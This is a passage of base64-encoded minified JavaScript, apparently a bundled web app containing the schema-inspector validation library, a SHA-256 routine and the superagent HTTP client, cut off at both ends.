mFjaygpLHZvaWQgbigpKX0pfSxmdW5jdGlvbihlKXtuKGUsdCl9KTtyZXR1cm4gdH19O3QobC5wcm90b3R5cGUsTSksdChsLnByb3RvdHlwZSxMKSx0KGwsbmV3IGkpLGwucHJvdG90eXBlLnNhbml0aXplPWZ1bmN0aW9uKGUsdCl7aWYodGhpcy5vcmlnaW49ZSwiZnVuY3Rpb24iPT10eXBlb2YgdCl7dmFyIG49dGhpcztyZXR1cm4gdGhpcy5fYXN5bmNTYW5pdGl6ZSh0aGlzLl9zY2hlbWEsZSxmdW5jdGlvbihlLHIpe24ub3JpZ2luPW51bGwsdChlLG4ucmVzdWx0KHIpKX0pfXZhciByPXRoaXMuX3Nhbml0aXplKHRoaXMuX3NjaGVtYSxlKTtyZXR1cm4gdGhpcy5vcmlnaW49bnVsbCx0aGlzLnJlc3VsdChyKX0sbC5wcm90b3R5cGUuX3Nhbml0aXplPWZ1bmN0aW9uKGUsdCl7cmV0dXJuIHRoaXMudXNlckFsaWFzPWUuYWxpYXN8fG51bGwsdGhpcy5fYmFzaWNGaWVsZHMuZm9yRWFjaChmdW5jdGlvbihuKXsobiBpbiBlfHwib3B0aW9uYWwiPT09bikmJiJmdW5jdGlvbiI9PXR5cGVvZiB0aGlzW25dJiYodD10aGlzW25dKGUsdCkpfSx0aGlzKSx0aGlzLl9jdXN0b21GaWVsZHMuZm9yRWFjaChmdW5jdGlvbihuKXtuIGluIGUmJiJmdW5jdGlvbiI9PXR5cGVvZiB0aGlzLl9jdXN0b21bbl0mJih0PXRoaXMuX2N1c3RvbVtuXS5jYWxsKHRoaXMsZSx0KSl9LHRoaXMpLHR9LGwucHJvdG90eXBlLl9hc3luY1Nhbml0aXplPWZ1bmN0aW9uKGUsdCxuKXt2YXIgcj10aGlzO3RoaXMudXNlckFsaWFzPWUuYWxpYXN8fG51bGwscC53YXRlcmZhbGwoW2Z1bmN0aW9uKG4pe3AucmVkdWNlKHIuX2Jhc2ljRmllbGRzLHQsZnVuY3Rpb24odCxuLGkpe3AubmV4dFRpY2soZnVuY3Rpb24oKXtpZigobiBpbiBlfHwib3B0aW9uYWwiPT09bikmJiJmdW5jdGlvbiI9PXR5cGVvZiByW25dKXtpZihyW25dLmxlbmd0aD4yKXJldHVybiByW25dKGUsdCxpKTt0PXJbbl0oZSx0KX1pKG51bGwsdCl9KX0sbil9LGZ1bmN0aW9uKHQsbil7cC5yZWR1Y2Uoci5fY3VzdG9tRmllbGRzLHQsZnVuY3Rpb24odCxuLGkpe3AubmV4dFRpY2soZnVuY3Rpb24oKXtpZihuIGluIGUmJiJmdW5jdGlvbiI9PXR5cGVvZiByLl9jdXN0b21bbl0pe2lmKHIuX2N1c3RvbVtuXS5sZW5ndGg+MilyZXR1cm4gci5fY3VzdG9tW25dLmNhbGwocixlLHQsaSk7dD1yLl9jdXN0b21bbl0uY2FsbChyLGUsdCl9aShudWxsLHQpfSl9LG4pfV0sbil9O3ZhciBrPS0yMTQ3NDgzNjQ4LHc9MjE0NzQ4MzY0NyxUPXsiaW50IjpmdW5jdGlvbihlLHQpe3JldHVybiBlKygwfE1hdGgucmFuZG9tKCkqKHQtZSsxKSl9LCJmbG9hdCI6ZnVuY3Rpb24oZSx0KXtyZXR1cm4gTWF0aC5yYW5kb20oKSoodC1lKStlfSxib29sOmZ1bmN0aW9uKCl7cmV0dXJuIE1hdGgucmFuZG9tKCk+LjV9LCJjaGFyIjpmdW5jdGlvbihlLHQpe3JldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKHRoaXNbImludCJdKGUsdCkpfSxmcm9tTGlzdDpmdW5jdGlvbihlKXtyZXR1cm4gZVt0aGlzWyJpbnQiXSgwLGUubGVuZ3RoLTEpXX19LFk9eyJkYXRlLXRpbWUiOmZ1bmN0aW9uKCl7cmV0dXJuKG5ldyBEYXRlKS50b0lTT1N0cmluZygpfSxkYXRlOmZ1bmN0aW9uKCl7cmV0dXJuKG5ldyBEYXRlKS50b0lTT1N0cmluZygpLnJlcGxhY2UoL1QuKiQvLCIiKX0sdGltZTpmdW5jdGlvbigpe3JldHVybihuZXcgRGF0ZSkudG9Mb2NhbGVUaW1lU3RyaW5nKHt9LHtob3VyMTI6ITF9KX0sY29sb3I6ZnVuY3Rpb24oZSx0KXt2YXIgbj0iIyI7MT5lJiYoZT0xKTtmb3IodmFyIHI9MCxpPVRbImludCJdKGUsdCk7aT5yO3IrKyluKz1ULmZyb21MaXN0KCIwMTIzNDU2Nzg5YWJjZGVmQUJDREVGIik7cmV0dXJuIG59LG51bWVyaWM6ZnVuY3Rpb24oKXtyZXR1cm4iIitUWyJpbnQiXSgwLHcpfSxpbnRlZ2VyOmZ1bmN0aW9uKCl7cmV0dXJuIFQuYm9vbCgpPT09ITA/Ii0iK3RoaXMubnVtZXJpYygpOnRoaXMubnVtZXJpYygpfSxkZWNpbWFsOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuaW50ZWdlcigpKyIuIit0aGlzLm51bWVyaWMoKX0sYWxwaGE6ZnVuY3Rpb24oZSx0KXt2YXIgbj0iIjsxPmUmJihlPTEpO2Zvcih2YXIgcj0wLGk9VFsiaW50Il0oZSx0KTtpPnI7cisrKW4rPVQuZnJvbUxpc3QoImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiKTtyZXR1cm4gbn0sYWxwaGFOdW1lcmljOmZ1bmN0aW9uKGUsdCl7dmFyIG49IiI7MT5lJiYoZT0xKTtmb3IodmFyIHI9MCxpPVRbImludCJdKGUsdCk7aT5yO3IrKyluKz1ULmZyb21MaXN0KCJhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OSIpO3JldHVybiBufSxhbHBoYURhc2g6ZnVuY3Rpb24oZSx0KXt2YXIgbj0iIjsxPmUmJihlPTEpO2Zvcih2YXIgcj0wLGk9VFsiaW50Il0oZSx0KTtpPnI7cisrKW4rPVQuZnJvbUxpc3QoIl8tYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpfLUFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaXy0wMTIzNDU2Nzg5Xy0iKTtyZXR1cm4gbn0samF2YXNjcmlwdDpmdW5jdGlvbihlLHQpe2Zvcih2YXIgbj1ULmZyb21MaXN0KCJfJGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6XyRBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWl8kIikscj0wLGk9VFsiaW50Il0oZSx0LTEpO2k+cjtyKyspbis9VC5mcm9tTGlzdCgiXyRhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5el8kQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpfJDAxMjM0NTY3ODlfJCIpO3JldHVybiBufX0sRD17c3RyaW5nOmZ1bmN0aW9uKGUpe2lmKG51bGwhPWUuZXEpcmV0dXJuIGUuZXE7dmFyIHQ9IiIsbj1udWxsIT1lLm1pbkxlbmd0aD9lLm1pbkxlbmd0aDowLHI9bnVsbCE9ZS5tYXhMZW5ndGg/ZS5tYXhMZW5ndGg6MzI7aWYoInN0cmluZyI9PXR5cGVvZiBlLnBhdHRlcm4mJiJmdW5jdGlvbiI9PXR5cGVvZiBZW2UucGF0dGVybl0pcmV0dXJuIFlbZS5wYXR0ZXJuXShuLHIpO2Zvcih2YXIgaT1udWxsIT1lLmV4YWN0TGVuZ3RoP2UuZXhhY3RMZW5ndGg6VFsiaW50Il0obixyKSxzPTA7aT5zO3MrKyl0Kz1UWyJjaGFyIl0oMzIsMTI2KTtyZXR1cm4gdH0sbnVtYmVyOmZ1bmN0aW9uKGUpe2lmKG51bGwhPWUuZXEpcmV0dXJuIGUuZXE7dmFyIHQ9ZChlKSxuPVRbImZsb2F0Il0odC5taW4sdC5tYXgpO2lmKG51bGwhPWUubmUpZm9yKHZhciByPV8uYXJyYXkoZS5uZSk/ZS5uZTpbZS5uZV07LTEhPT1yLmluZGV4T2Yobik7KW49VFsiZmxvYXQiXSh0Lm1pbix0Lm1heCk7cmV0dXJuIG59LGludGVnZXI6ZnVuY3Rpb24oZSl7aWYobnVsbCE9ZS5lcSlyZXR1cm4gZS5lcTt2YXIgdD1kKGUpLG49VFsiaW50Il0odC5taW4sdC5tYXgpO2lmKG51bGwhPWUubmUpZm9yKHZhciByPV8uYXJyYXkoZS5uZSk/ZS5uZTpbZS5uZV07LTEhPT1yLmluZGV4T2Yobik7KW49VFsiaW50Il0odC5taW4sdC5tYXgpO3JldHVybiBufSwiYm9vbGVhbiI6ZnVuY3Rpb24oZSl7cmV0dXJuIG51bGwhPWUuZXE/ZS5lcTpULmJvb2woKX0sIm51bGwiOmZ1bmN0aW9uKGUpe3JldHVybiBudWxsfSxkYXRlOmZ1bmN0aW9uKGUpe3JldHVybiBudWxsIT1lLmVxP2UuZXE6bmV3IERhdGV9LG9iamVjdDpmdW5jdGlvbihlKXt2YXIgdD17fSxuPWUucHJvcGVydGllc3x8e307Zm9yKHZhciByIGluIG4paWYobi5oYXNPd25Qcm9wZXJ0eShyKSl7aWYobltyXS5vcHRpb25hbD09PSEwJiZULmJvb2woKT09PSEwKWNvbnRpbnVlO2lmKCIqIiE9PXIpdFtyXT10aGlzLmdlbmVyYXRlKG5bcl0pO2Vsc2UgZm9yKHZhciBpPSJfX3JhbmRvbV9rZXlfIixzPWkrMCxvPVRbImludCJdKDEsOSksYT0xO28+PWE7YSsrKXMgaW4gbnx8KHRbc109dGhpcy5nZW5lcmF0ZShuW3JdKSkscz1pK2F9cmV0dXJuIHR9LGFycmF5OmZ1bmN0aW9uKGUpe3ZhciB0LG4scixpLHM9dGhpcyxvPWUuaXRlbXN8fHt9LGE9bnVsbCE9ZS5taW5MZW5ndGg/ZS5taW5MZW5ndGg6MCx1PW51bGwhPWUubWF4TGVuZ3RoP2UubWF4TGVuZ3RoOjE2O2lmKF8uYXJyYXkobykpZm9yKHI9by5sZW5ndGgsbnVsbCE9ZS5leGFjdExlbmd0aD9yPWUuZXhhY3RMZW5ndGg6YT5yP3I9YTpyPnUmJihyPXUpLG49bmV3IEFycmF5KHIpLHQ9bnVsbCxpPTA7cj5pO2krKyl0PW9baV0udHlwZXx8ImFueSIsXy5hcnJheSh0KSYmKHQ9dFtUWyJpbnQiXSgwLHQubGVuZ3RoLTEpXSksbltpXT1zW3RdKG9baV0pO2Vsc2UgZm9yKHI9bnVsbCE9ZS5leGFjdExlbmd0aD9lLmV4YWN0TGVuZ3RoOlRbImludCJdKGEsdSksbj1uZXcgQXJyYXkociksdD1vLnR5cGV8fCJhbnkiLF8uYXJyYXkodCkmJih0PXRbVFsiaW50Il0oMCx0Lmxlbmd0aC0xKV0pLGk9MDtyPmk7aSsrKW5baV09c1t0XShvKTtyZXR1cm4gbn0sYW55OmZ1bmN0aW9uKGUpe3ZhciB0PU9iamVjdC5rZXlzKEQpLG49dFtUWyJpbnQiXSgwLHQubGVuZ3RoLTIpXTtyZXR1cm4gdGhpc1tuXShlKX19O3QoaC5wcm90b3R5cGUsRCk7dmFyIFM9bnVsbDtoLmluc3RhbmNlPWZ1bmN0aW9uKCl7cmV0dXJuIFMgaW5zdGFuY2VvZiBofHwoUz1uZXcgaCksU30saC5wcm90b3R5cGUuZ2VuZXJhdGU9ZnVuY3Rpb24oZSl7dmFyIHQ9ZS50eXBlfHwiYW55IjtyZXR1cm4gXy5hcnJheSh0KSYmKHQ9dFtUWyJpbnQiXSgwLHQubGVuZ3RoLTEpXSksdGhpc1t0XShlKX07dmFyIHg9e307InVuZGVmaW5lZCIhPXR5cGVvZiBlJiZlLmV4cG9ydHM/ZS5leHBvcnRzPXg6d2luZG93LlNjaGVtYUluc3BlY3Rvcj14LHgubmV3U2FuaXRpemF0aW9uPWZ1bmN0aW9uKGUsdCl7cmV0dXJuIG5ldyBsKGUsdCl9LHgubmV3VmFsaWRhdGlvbj1mdW5jdGlvbihlLHQpe3JldHVybiBuZXcgYyhlLHQpfSx4LlZhbGlkYXRpb249Yyx4LlNhbml0aXphdGlvbj1sLHguc2FuaXRpemU9ZnVuY3Rpb24oZSx0LG4scil7cmV0dXJuIDM9PT1hcmd1bWVudHMubGVuZ3RoJiYiZnVuY3Rpb24iPT10eXBlb2YgbiYmKHI9bixuPW51bGwpLG5ldyBsKGUsbikuc2FuaXRpemUodCxyKX0seC52YWxpZGF0ZT1mdW5jdGlvbihlLHQsbixyKXtyZXR1cm4gMz09PWFyZ3VtZW50cy5sZW5ndGgmJiJmdW5jdGlvbiI9PXR5cGVvZiBuJiYocj1uLG49bnVsbCksbmV3IGMoZSxuKS52YWxpZGF0ZSh0LHIpfSx4LmdlbmVyYXRlPWZ1bmN0aW9uKGUsdCl7aWYoIm51bWJlciI9PXR5cGVvZiB0KXtmb3IodmFyIG49bmV3IEFycmF5KHQpLHI9MDt0PnI7cisrKW5bcl09aC5pbnN0YW5jZSgpLmdlbmVyYXRlKGUpO3JldHVybiBufXJldHVybiBoLmluc3RhbmNlKCkuZ2VuZXJhdGUoZSl9fSgpfSxmdW5jdGlvbihlLHQsbil7IWZ1bmN0aW9uKHQpeyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUsdCl7ZS5jb25zdHJ1Y3Rvcj09PVN0cmluZyYmKGU9aS5jb252ZXJ0U3RyaW5nLlVURjguc3RyaW5nVG9CeXRlcyhlKSk7dmFyIG49WzE3NzkwMzM3MDMsMzE0NDEzNDI3NywxMDEzOTA0MjQyLDI3NzM0ODA3NjIsMTM1OTg5MzExOSwyNjAwODIyOTI0LDUyODczNDYzNSwxNTQxNDU5MjI1XSxyPW8oZSkscz04KmUubGVuZ3RoO3Jbcz4+NV18PTEyODw8MjQtcyUzMixyWyhzKzY0Pj45PDw0KSsxNV09cztmb3IodmFyIHU9MDt1PHIubGVuZ3RoO3UrPTE2KWMobixyLHUpO3ZhciBsPWEobik7cmV0dXJuIHQmJnQuYXNCeXRlcz9sOnQmJnQuYXNTdHJpbmc/aS5jb252ZXJ0U3RyaW5nLmJ5dGVzVG9TdHJpbmcobCk6aS5ieXRlc1RvSGV4KGwpfXZhciBpPXt9OyJ1bmRlZmluZWQiIT10eXBlb2YgZSYmZS5leHBvcnRzPyhpLmJ5dGVzVG9IZXg9bigxNTEpLmJ5dGVzVG9IZXgsaS5jb252ZXJ0U3RyaW5nPW4oMTUyKSxlLmV4cG9ydHM9cik6KGkuYnl0ZXNUb0hleD10LmNvbnZlcnRIZXguYnl0ZXNUb0hleCxpLmNvbnZlcnRTdHJpbmc9dC5jb252ZXJ0U3RyaW5nLHQuc2hhMjU2PXIpO3ZhciBzPVtdOyFmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSl7Zm9yKHZhciB0PU1hdGguc3FydChlKSxuPTI7dD49bjtuKyspaWYoIShlJW4pKXJldHVybiExO3JldHVybiEwfWZ1bmN0aW9uIHQoZSl7cmV0dXJuIDQyOTQ5NjcyOTYqKGUtKDB8ZSkpfDB9Zm9yKHZhciBuPTIscj0wOzY0PnI7KWUobikmJihzW3JdPXQoTWF0aC5wb3cobiwxLzMpKSxyKyspLG4rK30oKTt2YXIgbz1mdW5jdGlvbihlKXtmb3IodmFyIHQ9W10sbj0wLHI9MDtuPGUubGVuZ3RoO24rKyxyKz04KXRbcj4+PjVdfD1lW25dPDwyNC1yJTMyO3JldHVybiB0fSxhPWZ1bmN0aW9uKGUpe2Zvcih2YXIgdD1bXSxuPTA7bjwzMiplLmxlbmd0aDtuKz04KXQucHVzaChlW24+Pj41XT4+PjI0LW4lMzImMjU1KTtyZXR1cm4gdH0sdT1bXSxjPWZ1bmN0aW9uKGUsdCxuKXtmb3IodmFyIHI9ZVswXSxpPWVbMV0sbz1lWzJdLGE9ZVszXSxjPWVbNF0sbD1lWzVdLGQ9ZVs2XSxoPWVbN10sZj0wOzY0PmY7ZisrKXtpZigxNj5mKXVbZl09MHx0W24rZl07ZWxzZXt2YXIgcD11W2YtMTVdLF89KHA8PDI1fHA+Pj43KV4ocDw8MTR8cD4+PjE4KV5wPj4+MyxtPXVbZi0yXSx5PShtPDwxNXxtPj4+MTcpXihtPDwxM3xtPj4+MTkpXm0+Pj4xMDt1W2ZdPV8rdVtmLTddK3krdVtmLTE2XX12YXIgZz1jJmxefmMmZCx2PXImaV5yJm9eaSZvLGI9KHI8PDMwfHI+Pj4yKV4ocjw8MTl8cj4+PjEzKV4ocjw8MTB8cj4+PjIyKSxNPShjPDwyNnxjPj4+NileKGM8PDIxfGM+Pj4xMSleKGM8PDd8Yz4+PjI1KSxMPWgrTStnK3NbZl0rdVtmXSxrPWIrdjtoPWQsZD1sLGw9YyxjPWErTHwwLGE9byxvPWksaT1yLHI9TCtrfDB9ZVswXT1lWzBdK3J8MCxlWzFdPWVbMV0raXwwLGVbMl09ZVsyXStvfDAsZVszXT1lWzNdK2F8MCxlWzRdPWVbNF0rY3wwLGVbNV09ZVs1XStsfDAsZVs2XT1lWzZdK2R8MCxlWzddPWVbN10raHwwfTtyLngyPWZ1bmN0aW9uKGUsdCl7cmV0dXJuIHIocihlLHthc0J5dGVzOiEwfSksdCl9fSh0aGlzKX0sZnVuY3Rpb24oZSx0LG4pe2Z1bmN0aW9uIHIoKXt9ZnVuY3Rpb24gaShlKXt2YXIgdD17fS50b1N0cmluZy5jYWxsKGUpO3N3aXRjaCh0KXtjYXNlIltvYmplY3QgRmlsZV0iOmNhc2UiW29iamVjdCBCbG9iXSI6Y2FzZSJbb2JqZWN0IEZvcm1EYXRhXSI6cmV0dXJuITA7ZGVmYXVsdDpyZXR1cm4hMX19ZnVuY3Rpb24gcyhlKXtpZighdihlKSlyZXR1cm4gZTt2YXIgdD1bXTtmb3IodmFyIG4gaW4gZSludWxsIT1lW25dJiZvKHQsbixlW25dKTtyZXR1cm4gdC5qb2luKCImIil9ZnVuY3Rpb24gbyhlLHQsbil7cmV0dXJuIEFycmF5LmlzQXJyYXkobik/bi5mb3JFYWNoKGZ1bmN0aW9uKG4pe28oZSx0LG4pfSk6dm9pZCBlLnB1c2goZW5jb2RlVVJJQ29tcG9uZW50KHQpKyI9IitlbmNvZGVVUklDb21wb25lbnQobikpfWZ1bmN0aW9uIGEoZSl7Zm9yKHZhciB0LG4scj17fSxpPWUuc3BsaXQoIiYiKSxzPTAsbz1pLmxlbmd0aDtvPnM7KytzKW49aVtzXSx0PW4uc3BsaXQoIj0iKSxyW2RlY29kZVVSSUNvbXBvbmVudCh0WzBdKV09ZGVjb2RlVVJJQ29tcG9uZW50KHRbMV0pO3JldHVybiByfWZ1bmN0aW9uIHUoZSl7dmFyIHQsbixyLGkscz1lLnNwbGl0KC9ccj9cbi8pLG89e307cy5wb3AoKTtmb3IodmFyIGE9MCx1PXMubGVuZ3RoO3U+YTsrK2Epbj1zW2FdLHQ9bi5pbmRleE9mKCI6Iikscj1uLnNsaWNlKDAsdCkudG9Mb3dlckNhc2UoKSxpPU0obi5zbGljZSh0KzEpKSxvW3JdPWk7cmV0dXJuIG99ZnVuY3Rpb24gYyhlKXtyZXR1cm4vW1wvK11qc29uXGIvLnRlc3QoZSl9ZnVuY3Rpb24gbChlKXtyZXR1cm4gZS5zcGxpdCgvICo7ICovKS5zaGlmdCgpfWZ1bmN0aW9uIGQoZSl7cmV0dXJuIHkoZS5zcGxpdCgvICo7ICovKSxmdW5jdGlvbihlLHQpe3ZhciBuPXQuc3BsaXQoLyAqPSAqLykscj1uLnNoaWZ0KCksaT1uLnNoaWZ0KCk7cmV0dXJuIHImJmkmJihlW3JdPWkpLGV9LHt9KX1mdW5jdGlvbiBoKGUsdCl7dD10fHx7fSx0aGlzLnJlcT1lLHRoaXMueGhyPXRoaXMucmVxLnhocix0aGlzLnRleHQ9IkhFQUQiIT10aGlzLnJlcS5tZXRob2QmJigiIj09PXRoaXMueGhyLnJlc3BvbnNlVHlwZXx8InRleHQiPT09dGhpcy54aHIucmVzcG9uc2VUeXBlKXx8InVuZGVmaW5lZCI9PXR5cGVvZiB0aGlzLnhoci5yZXNwb25zZVR5cGU/dGhpcy54aHIucmVzcG9uc2VUZXh0Om51bGwsdGhpcy5zdGF0dXNUZXh0PXRoaXMucmVxLnhoci5zdGF0dXNUZXh0LHRoaXMuc2V0U3RhdHVzUHJvcGVydGllcyh0aGlzLnhoci5zdGF0dXMpLHRoaXMuaGVhZGVyPXRoaXMuaGVhZGVycz11KHRoaXMueGhyLmdldEFsbFJlc3BvbnNlSGVhZGVycygpKSx0aGlzLmhlYWRlclsiY29udGVudC10eXBlIl09dGhpcy54aHIuZ2V0UmVzcG9uc2VIZWFkZXIoImNvbnRlbnQtdHlwZSIpLHRoaXMuc2V0SGVhZGVyUHJvcGVydGllcyh0aGlzLmhlYWRlciksdGhpcy5ib2R5PSJIRUFEIiE9dGhpcy5yZXEubWV0aG9kP3RoaXMucGFyc2VCb2R5KHRoaXMudGV4dD90aGlzLnRleHQ6dGhpcy54aHIucmVzcG9uc2UpOm51bGx9ZnVuY3Rpb24gZihlLHQpe3ZhciBuPXRoaXM7dGhpcy5fcXVlcnk9dGhpcy5fcXVlcnl8fFtdLHRoaXMubWV0aG9kPWUsdGhpcy51cmw9dCx0aGlzLmhlYWRlcj17fSx0aGlzLl9oZWFkZXI9e30sdGhpcy5vbigiZW5kIixmdW5jdGlvbigpe3ZhciBlPW51bGwsdD1udWxsO3RyeXt0PW5ldyBoKG4pfWNhdGNoKHIpe3JldHVybiBlPW5ldyBFcnJvcigiUGFyc2VyIGlzIHVuYWJsZSB0byBwYXJzZSB0aGUgcmVzcG9uc2UiKSxlLnBhcnNlPSEwLGUub3JpZ2luYWw9cixlLnJhd1Jlc3BvbnNlPW4ueGhyJiZuLnhoci5yZXNwb25zZVRleHQ/bi54aHIucmVzcG9uc2VUZXh0Om51bGwsZS5zdGF0dXNDb2RlPW4ueGhyJiZuLnhoci5zdGF0dXM/bi54aHIuc3RhdHVzOm51bGwsbi5jYWxsYmFjayhlKX1pZihuLmVtaXQoInJlc3BvbnNlIix0KSxlKXJldHVybiBuLmNhbGxiYWNrKGUsdCk7aWYodC5zdGF0dXM+PTIwMCYmdC5zdGF0dXM8MzAwKXJldHVybiBuLmNhbGxiYWNrKGUsdCk7dmFyIGk9bmV3IEVycm9yKHQuc3RhdHVzVGV4dHx8IlVuc3VjY2Vzc2Z1bCBIVFRQIHJlc3BvbnNlIik7aS5vcmlnaW5hbD1lLGkucmVzcG9uc2U9dCxpLnN0YXR1cz10LnN0YXR1cyxuLmNhbGxiYWNrKGksdCl9KX1mdW5jdGlvbiBwKGUsdCl7dmFyIG49YigiREVMRVRFIixlKTtyZXR1cm4gdCYmbi5lbmQodCksbn12YXIgXyxtPW4oMTUwKSx5PW4oMTY5KSxnPW4oMTczKSx2PW4oMzYpO189InVuZGVmaW5lZCIhPXR5cGVvZiB3aW5kb3c/d2luZG93OiJ1bmRlZmluZWQiIT10eXBlb2Ygc2VsZj9zZWxmOnRoaXM7dmFyIGI9ZS5leHBvcnRzPW4oMTc0KS5iaW5kKG51bGwsZik7Yi5nZXRYSFI9ZnVuY3Rpb24oKXtpZighKCFfLlhNTEh0dHBSZXF1ZXN0fHxfLmxvY2F0aW9uJiYiZmlsZToiPT1fLmxvY2F0aW9uLnByb3RvY29sJiZfLkFjdGl2ZVhPYmplY3QpKXJldHVybiBuZXcgWE1MSHR0cFJlcXVlc3Q7dHJ5e3JldHVybiBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKX1jYXRjaChlKXt9dHJ5e3JldHVybiBuZXcgQWN0aXZlWE9iamVjdCgiTXN4bWwyLlhNTEhUVFAuNi4wIil9Y2F0Y2goZSl7fXRyeXtyZXR1cm4gbmV3IEFjdGl2ZVhPYmplY3QoIk1zeG1sMi5YTUxIVFRQLjMuMCIpfWNhdGNoKGUpe310cnl7cmV0dXJuIG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpfWNhdGNoKGUpe31yZXR1cm4hMX07dmFyIE09IiIudHJpbT9mdW5jdGlvbihlKXtyZXR1cm4gZS50cmltKCl9OmZ1bmN0aW9uKGUpe3JldHVybiBlLnJlcGxhY2UoLyheXHMqfFxzKiQpL2csIiIpfTtiLnNlcmlhbGl6ZU9iamVjdD1zLGIucGFyc2VTdHJpbmc9YSxiLnR5cGVzPXtodG1sOiJ0ZXh0L2h0bWwiLGpzb246ImFwcGxpY2F0aW9uL2pzb24iLHhtbDoiYXBwbGljYXRpb24veG1sIix1cmxlbmNvZGVkOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLGZvcm06ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsImZvcm0tZGF0YSI6ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJ9LGIuc2VyaWFsaXplPXsiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIjpzLCJhcHBsaWNhdGlvbi9qc29uIjpKU09OLnN0cmluZ2lmeX0sYi5wYXJzZT17ImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCI6YSwiYXBwbGljYXRpb24vanNvbiI6SlNPTi5wYXJzZX0saC5wcm90b3R5cGUuZ2V0PWZ1bmN0aW9uKGUpe3JldHVybiB0aGlzLmhlYWRlcltlLnRvTG93ZXJDYXNlKCldfSxoLnByb3RvdHlwZS5zZXRIZWFkZXJQcm9wZXJ0aWVzPWZ1bmN0aW9uKGUpe3ZhciB0PXRoaXMuaGVhZGVyWyJjb250ZW50LXR5cGUiXXx8IiI7dGhpcy50eXBlPWwodCk7dmFyIG49ZCh0KTtmb3IodmFyIHIgaW4gbil0aGlzW3JdPW5bcl19LGgucHJvdG90eXBlLnBhcnNlQm9keT1mdW5jdGlvbihlKXt2YXIgdD1iLnBhcnNlW3RoaXMudHlwZV07cmV0dXJuIXQmJmModGhpcy50eXBlKSYmKHQ9Yi5wYXJzZVsiYXBwbGljYXRpb24vanNvbiJdKSx0JiZlJiYoZS5sZW5ndGh8fGUgaW5zdGFuY2VvZiBPYmplY3QpP3QoZSk6bnVsbH0saC5wcm90b3R5cGUuc2V0U3RhdHVzUHJvcGVydGllcz1mdW5jdGlvbihlKXsxMjIzPT09ZSYmKGU9MjA0KTt2YXIgdD1lLzEwMHwwO3RoaXMuc3RhdHVzPXRoaXMuc3RhdHVzQ29kZT1lLHRoaXMuc3RhdHVzVHlwZT10LHRoaXMuaW5mbz0xPT10LHRoaXMub2s9Mj09dCx0aGlzLmNsaWVudEVycm9yPTQ9PXQsdGhpcy5zZXJ2ZXJFcnJvcj01PT10LHRoaXMuZXJyb3I9ND09dHx8NT09dD90aGlzLnRvRXJyb3IoKTohMSx0aGlzLmFjY2VwdGVkPTIwMj09ZSx0aGlzLm5vQ29udGVudD0yMDQ9PWUsdGhpcy5iYWRSZXF1ZXN0PTQwMD09ZSx0aGlzLnVuYXV0aG9yaXplZD00MDE9PWUsdGhpcy5ub3RBY2NlcHRhYmxlPTQwNj09ZSx0aGlzLm5vdEZvdW5kPTQwND09ZSx0aGlzLmZvcmJpZGRlbj00MDM9PWV9LGgucHJvdG90eXBlLnRvRXJyb3I9ZnVuY3Rpb24oKXt2YXIgZT10aGlzLnJlcSx0PWUubWV0aG9kLG49ZS51cmwscj0iY2Fubm90ICIrdCsiICIrbisiICgiK3RoaXMuc3RhdHVzKyIpIixpPW5ldyBFcnJvcihyKTtyZXR1cm4gaS5zdGF0dXM9dGhpcy5zdGF0dXMsaS5tZXRob2Q9dCxpLnVybD1uLGl9LGIuUmVzcG9uc2U9aCxtKGYucHJvdG90eXBlKTtmb3IodmFyIEwgaW4gZylmLnByb3RvdHlwZVtMXT1nW0xdO2YucHJvdG90eXBlLmFib3J0PWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuYWJvcnRlZD92b2lkIDA6KHRoaXMuYWJvcnRlZD0hMCx0aGlzLnhoci5hYm9ydCgpLHRoaXMuY2xlYXJUaW1lb3V0KCksdGhpcy5lbWl0KCJhYm9ydCIpLHRoaXMpfSxmLnByb3RvdHlwZS50eXBlPWZ1bmN0aW9uKGUpe3JldHVybiB0aGlzLnNldCgiQ29udGVudC1UeXBlIixiLnR5cGVzW2VdfHxlKSx0aGlzfSxmLnByb3RvdHlwZS5yZXNwb25zZVR5cGU9ZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMuX3Jlc3BvbnNlVHlwZT1lLHRoaXN9LGYucHJvdG90eXBlLmFjY2VwdD1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5zZXQoIkFjY2VwdCIsYi50eXBlc1tlXXx8ZSksdGhpc30sZi5wcm90b3R5cGUuYXV0aD1mdW5jdGlvbihlLHQsbil7c3dpdGNoKG58fChuPXt0eXBlOiJiYXNpYyJ9KSxuLnR5cGUpe2Nhc2UiYmFzaWMiOnZhciByPWJ0b2EoZSsiOiIrdCk7dGhpcy5zZXQoIkF1dGhvcml6YXRpb24iLCJCYXNpYyAiK3IpO2JyZWFrO2Nhc2UiYXV0byI6dGhpcy51c2VybmFtZT1lLHRoaXMucGFzc3dvcmQ9dH1yZXR1cm4gdGhpc30sZi5wcm90b3R5cGUucXVlcnk9ZnVuY3Rpb24oZSl7cmV0dXJuInN0cmluZyIhPXR5cGVvZiBlJiYoZT1zKGUpKSxlJiZ0aGlzLl9xdWVyeS5wdXNoKGUpLHRoaXN9LGYucHJvdG90eXBlLmF0dGFjaD1mdW5jdGlvbihlLHQsbil7cmV0dXJuIHRoaX